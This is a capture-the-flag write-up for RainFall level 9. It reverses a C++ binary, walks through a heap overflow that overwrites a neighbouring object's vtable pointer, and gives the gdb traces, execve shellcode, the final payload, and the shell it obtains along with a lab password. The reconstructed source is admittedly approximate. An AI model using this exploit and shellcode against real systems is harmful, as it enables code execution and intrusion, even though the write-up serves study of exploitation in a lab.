# Level 9

<h3>source.c</h3>

```console
class N {
  private:
    char annotation[100];
    int nb;

  public:
    N(int nb) {
      this->nb = nb;
    }

    int operator+(N &other) {
      return (this->nb + other.nb);
    }

    int operator-(N &other) {
      return (other.nb - this->nb);
    }

    void *setAnnotation(char* str) {
      return (memcpy(this->annotation, str, strlen(str)));
    }
}

int main(int argc, char** argv) {
  if (argc < 1) {
    _exit(1);
  }

  N *l_var1 = new N(5);
  N *l_var2 = new N(6);

  l_var1->setAnnotation(argv[1]);
  return(**l_var2(l_var2, l_var1)); // this im not sure
}
```

<h3>Analysis</h3>

In this level, the program is written as c++ code and it was quite hard to reverse it, so this might not be super accurate

We can see that there is no `system()` or the `.pass` file being read anywhere, so we might need to use `shellcode` to spawn a shell

The only clue that we can exploit is the `memcpy()` which is vulnerable to buffer overflow as well,

and call to `edx` on line main + 159 which is gotten by dereferrencing [esp+0x10] (l_var2) twice

```console
0x0804867c <+136>:  mov    eax,DWORD PTR [esp+0x10]             copy [esp+0x10] (l_var2) into eax
0x08048680 <+140>:  mov    eax,DWORD PTR [eax]                  copy the content of eax (l_var2) into eax -> *l_var2
0x08048682 <+142>:  mov    edx,DWORD PTR [eax]                  copy the content of eax (*l_var2) into edx -> **l_var2
[...]
0x08048693 <+159>:  call   edx                                  call function edx
```

Each time a dereferrence occoured, means that it will read the content reside on that memory location, so it will looks like this `l_var2[0][0]` or `l_var2`

Our target this time will be to rewrite the address pointed by `l_var2` so that when the program call `edx`, it will be calling to our shell code instead

<h3>Exploit</h3>

First lets get the `shellcode` from `level2` which is 28 bytes

```console
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

Next lets visualize the memory area of `l_var1` and `l_var2`

```console
0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>      -> 1st new() return memory address to eax
0x0804861c <+40>:	mov    ebx,eax                    -> put a break point here to get the address to that pointer
[...]
0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>      -> 2nd new() return memory address to eax
0x0804863e <+74>:	mov    ebx,eax                    -> put a break point here to get the address to that pointer

(gdb) break *0x0804861c
Breakpoint 1 at 0x804861c
(gdb) break *0x0804863e
Breakpoint 2 at 0x804863e
(gdb) r aaaa
Starting program: /home/user/level9/level9 aaaa

Breakpoint 1, 0x0804861c in main ()
(gdb) x $eax
0x804a008:	0x00000000                              -> l_var1 will point to this address 0x0804a008
(gdb) continue
Continuing.

Breakpoint 2, 0x0804863e in main ()
(gdb) x $eax
0x804a078:	0x00000000                              -> l_var2 will point to this address 0x0804a078
```
Now we have the address for both variable, lets look at the heap to visualize it better

```console
[...]
0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]           -> put a break point here to see the state of the heap after the call of memcpy inside setAnnotation happened

(gdb) break *0x0804867c
Breakpoint 3 at 0x804867c
(gdb) continue
Continuing.

Breakpoint 3, 0x0804867c in main ()
(gdb) x/32wx 0x0804a008
0x804a008:	0x08048848	0x61616161	0x00000000	0x00000000    -> (0x0804a008) memory area of l_var1, started with 0x08048848 (_ZTV1N+8) to indicate this is N class
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071    -> we can see the private int 5 is being written here, but im not sure what 0x71 is
0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000    -> (0x0804a078) memory area of l_var2, started with 0x08048848 (_ZTV1N+8) to indicate this is N class
```

The heap memory management is abit different then what we used to see in a `c code`

There is no metadata block between the 2 allocated area, and both memory area located side by side each other

Base on this we can conclude that by adding the offset of `108 bytes`, we could reach the start of `l_var2` and start overwriting the data

Now we need to solve the double dereferrence problem for `l_var2`

```console
0x0804867c <+136>: mov eax,DWORD PTR [esp+0x10] -> copy [esp+0x10] (l_var2) to eax,            now eax = 0x0804a078 (The address point to the start of l_var2 memory area)
0x08048680 <+140>: mov eax,DWORD PTR [eax]      -> copy the content of eax (l_var2) to eax     now eax = 0x08048848 (The address point to virtual table for N class)
0x08048682 <+142>: mov edx,DWORD PTR [eax]      -> copy the content of eax (*l_var2) to edx    now eax = [0x08048848] (The virtual table for N class)
```

What we need to do now is to overwrite `0x0804a078` to point to another address, we could make it point to `l_var1 + 4` (`0x804A00c`) which is the start of the str buffer for `l_var1`

For the second dereferrence, we need to write the starting address of our shellcode into `l_var1 + 4` (`0x804A00c`), so we should put `l_var1 + 8` (`0x804a010`)

Now we can put write out `shellcode` in the `l_var1 + 8` (`0x804A010`) and when the program call `edx`, it will be dereferrence twice and ultimately reach our `shellcode`

Final payload:
`python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'a' * 76 + '\x0c\xa0\x04\x08'"`

```console
level9@RainFall:~$ ./level9 `python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'a' * 76 + '\x0c\xa0\x04\x08'"`
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```